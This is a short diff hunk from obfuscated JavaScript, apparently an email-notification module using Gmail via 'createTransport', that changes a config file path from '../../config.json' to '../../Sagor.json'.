@@ -57,7 +57,7 @@ function _0x1735() {
         'gmail',
         'please\x20provide\x20a\x20notification\x20message!',
         '4791420pxuzyX',
-        '../../config.json',
+        '../../Sagor.json',
         'createTransport',
         '14uaRjaq',
         '835881hwqQIg',
